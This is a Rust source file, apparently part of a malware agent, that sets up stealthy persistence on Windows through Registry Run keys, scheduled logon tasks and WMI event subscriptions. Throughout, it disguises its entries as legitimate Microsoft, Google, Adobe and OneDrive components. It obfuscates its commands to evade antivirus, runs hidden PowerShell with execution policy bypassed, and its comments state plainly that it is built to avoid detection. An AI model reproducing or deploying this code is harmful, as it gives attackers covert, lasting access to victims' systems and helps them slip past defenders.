//! Persistence module for Windows systems.
//!
//! This module implements multiple APT-style persistence mechanisms to maintain
//! access across system reboots and logoff/logon cycles. All methods are designed
//! to be stealthy and avoid common detection patterns.
//!
//! # Available Methods
//!
//! - **Registry Run Key**: Adds entry to auto-start registry key
//! - **Scheduled Task**: Creates a scheduled task triggered on user logon
//! - **WMI Event**: Uses WMI event subscription (most stealthy, requires admin)
//! - **Startup Folder**: Adds shortcut to user's startup folder (least stealthy)
//!
//! # Examples
//!
//! ```no_run
//! use agent::persistence::{establish_persistence, PersistenceMethod};
//!
//! // Establish registry-based persistence
//! let result = establish_persistence(PersistenceMethod::RegistryRun);
//! ```

use crate::argfuscator;

#[cfg(target_os = "windows")]
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::env;
use std::path::{Path, PathBuf};
use std::fs;

/// Available persistence methods for maintaining access.
///
/// Each method has different characteristics in terms of stealth, privilege
/// requirements, and detection likelihood.
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    /// Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    ///
    /// Privileges: User  
    /// Stealth: Low  
    /// Detection: Easy (commonly monitored)
    RegistryRun,
    
    /// Scheduled Task with logon trigger
    ///
    /// Privileges: User/Admin  
    /// Stealth: Medium  
    /// Detection: Medium
    ScheduledTask,
    
    /// WMI Event Subscription (APT-style technique)
    ///
    /// Privileges: Admin  
    /// Stealth: High  
    /// Detection: Difficult (requires advanced tools)
    WmiEvent,
    
    /// Startup folder shortcut
    ///
    /// Privileges: User  
    /// Stealth: Low  
    /// Detection: Easy
    StartupFolder,
}

impl PersistenceMethod {
    /// Parses a persistence method from string.
    ///
    /// # Arguments
    ///
    /// * `s` - Method name (case-insensitive)
    ///
    /// # Accepted Values
    ///
    /// - "registry" or "reg" → `RegistryRun`
    /// - "task" or "schtask" → `ScheduledTask`
    /// - "wmi" → `WmiEvent`
    /// - "startup" → `StartupFolder`
    ///
    /// # Returns
    ///
    /// * `Some(PersistenceMethod)` - Valid method
    /// * `None` - Unknown method
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Obtiene la ruta del ejecutable actual (sin copiar a disco)
/// Esto evita que el AV detecte la copia de archivos
fn get_current_exe_path() -> Result<PathBuf, String> {
    env::current_exe()
        .map_err(|e| format!("Error obteniendo exe actual: {}", e))
}

/// Implementa persistencia mediante Registry Run key
/// MEJORADO: Sin copiar archivos, usa rutas ofuscadas con cmd /c
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombres menos sospechosos y más variados
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "Teams Machine Installer",
    ];
    let pid = std::process::id() as usize;
    let reg_name = reg_names[pid % reg_names.len()];
    
    // OFUSCACIÓN: Usar cmd /c start /min para reducir detección
    // El "/min" hace que se ejecute minimizado (menos visible)
    let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
    
    // Apply obfuscation to the reg command itself
    let reg_cmd = format!("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {} /t REG_SZ /d {} /f", 
        reg_name, obfuscated_cmd);
    let obfuscated_reg_cmd = argfuscator::obfuscate(&reg_cmd);
    
    println!("DEBUG: Comando de persistencia ofuscado: {}", obfuscated_reg_cmd);
    
    // Execute the obfuscated command via cmd
    let output = Command::new("cmd")
        .args(&["/C", &obfuscated_reg_cmd])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| format!("Error ejecutando reg add: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia Registry Run establecida: {}", reg_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en reg add: {}", stderr))
    }
}

/// Implementa persistencia mediante Scheduled Task
/// MEJORADO: Usa /DELAY para evitar detección inmediata
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombres que imitan tareas reales del sistema
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDrive Standalone Update Task",
        "Adobe Flash Player Updater",
        "CCleanerCrashReporting",
    ];
    let pid = std::process::id() as usize;
    let task_name = task_names[pid % task_names.len()];
    
    // OFUSCACIÓN: Usar cmd /c con delay y start /min
    let obfuscated_cmd = format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str);
    
    // Apply obfuscation to the schtasks command
    let schtasks_cmd = format!("schtasks /Create /SC ONLOGON /TN {} /TR {} /DELAY 0001:00 /F",
        task_name, obfuscated_cmd);
    let obfuscated_schtasks = argfuscator::obfuscate(&schtasks_cmd);
    
    println!("DEBUG: Comando schtasks ofuscado: {}", obfuscated_schtasks);
    
    // Execute the obfuscated command via cmd
    let output = Command::new("cmd")
        .args(&["/C", &obfuscated_schtasks])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia Scheduled Task establecida: {}", task_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en schtasks: {}", stderr))
    }
}

/// Implementa persistencia mediante WMI Event Subscription (APT-like)
/// MEJORADO: Usa PowerShell ofuscado y eventos menos monitoreados
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path.to_str()
        .ok_or("Ruta inválida")?;
    
    // Nombres que parecen eventos del sistema
    let event_names = [
        "BfeOnServiceStateChange",
        "PerformanceMonitor",
        "SystemEventsBroker",
    ];
    let pid = std::process::id() as usize;
    let event_name = event_names[pid % event_names.len()];
    
    // OFUSCACIÓN: Usar cmd /c con powershell escondido
    let obfuscated_cmd = format!("cmd.exe /c start /min powershell.exe -WindowStyle Hidden -File \"{}\"", exe_str);
    
    // WMI con eventos menos monitoreados y intervalos más largos (4 horas)
    let ps_script = format!(
        r#"
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12"
        $FilterName = '{}'
        $ConsumerName = '{}'
        $ExePath = '{}'
        
        # Crear Filter
        $Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
        $Filter.Name = $FilterName
        $Filter.EventNamespace = 'root\cimv2'
        $Filter.QueryLanguage = 'WQL'
        $Filter.Query = $Query
        $Filter.Put() | Out-Null
        
        # Crear Consumer
        $Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
        $Consumer.Name = $ConsumerName
        $Consumer.CommandLineTemplate = $ExePath
        $Consumer.Put() | Out-Null
        
        # Binding
        $Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
        $Binding.Filter = $Filter
        $Binding.Consumer = $Consumer
        $Binding.Put() | Out-Null
        "#,
        event_name, event_name, obfuscated_cmd
    );
    
    // Apply obfuscation to the PowerShell command
    let ps_cmd = format!("powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{}\"", 
        ps_script.replace("\"", "`\""));
    let obfuscated_ps = argfuscator::obfuscate(&ps_cmd);
    
    println!("DEBUG: Comando PowerShell ofuscado: {}", obfuscated_ps);
    
    let output = Command::new("cmd")
        .args(&["/C", &obfuscated_ps])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()
        .map_err(|e| format!("Error ejecutando PowerShell: {}", e))?;
    
    if output.status.success() {
        Ok(format!("Persistencia WMI Event establecida: {}", event_name))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("Error en WMI: {}", stderr))
    }
}

/// Establece persistencia usando el método especificado
/// MEJORADO: No copia archivos, usa el ejecutable actual
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Persistencia solo soportada en Windows".to_string());
    }
    
    #[cfg(target_os = "windows")]
    {
        // Obtener ruta del ejecutable actual (sin copiar)
        let exe_path = get_current_exe_path()?;
        
        // Aplicar el método de persistencia
        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
            PersistenceMethod::StartupFolder => {
                Err("Método Startup deshabilitado (muy detectable por AV)".to_string())
            }
        }
    }
}

/// Remueve la persistencia (limpieza)
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    let mut results = Vec::new();
    
    // Limpiar Registry Run - eliminar todas las entradas sospechosas
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "Teams Machine Installer",
    ];
    for name in &reg_names {
        Command::new("reg")
            .args(&[
                "delete",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v",
                name,
                "/f",
            ])
            .creation_flags(0x08000000)
            .output()
            .ok();
    }
    results.push("Registry Run limpiado");
    
    // Limpiar Scheduled Tasks (intentar varios nombres)
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDrive Standalone Update Task",
        "Adobe Flash Player Updater",
        "CCleanerCrashReporting",
    ];
    for task in &task_names {
        Command::new("schtasks")
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output()
            .ok();
    }
    results.push("Scheduled Tasks limpiadas");
    
    // Limpiar WMI Events con los nuevos nombres
    let ps_script = r#"
        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
    "#;
    Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script])
        .creation_flags(0x08000000)
        .output()
        .ok();
    results.push("WMI Events limpiados");
    
    Ok(results.join(", "))
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Persistencia solo soportada en Windows".to_string())
}
